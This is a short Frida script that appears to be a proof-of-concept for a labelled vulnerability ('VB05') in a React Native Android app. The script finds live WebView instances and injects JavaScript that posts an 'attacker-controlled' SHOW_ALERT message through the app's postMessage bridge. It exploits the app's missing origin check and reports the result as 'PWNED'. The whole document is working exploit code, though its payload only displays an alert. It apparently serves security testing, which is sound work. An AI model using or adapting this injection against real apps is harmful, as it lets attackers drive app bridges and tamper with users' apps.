Java.perform(function () {
  Java.scheduleOnMainThread(function () {
    Java.choose("android.webkit.WebView", {
      onMatch: function (instance) {
        console.log("[VB05] Found WebView instance, injecting...");
        const payload = JSON.stringify({
          action: "SHOW_ALERT",
          payload: {
            title: "PWNED",
            message: "attacker-controlled via postMessage, no origin check",
          },
        });
        const js =
          "window.ReactNativeWebView.postMessage(" +
          JSON.stringify(payload) +
          ");";
        instance.evaluateJavascript(js, null);
        console.log("[VB05] Injected: " + js);
      },
      onComplete: function () {
        console.log("[VB05] Done searching for WebView instances");
      },
    });
  });
});
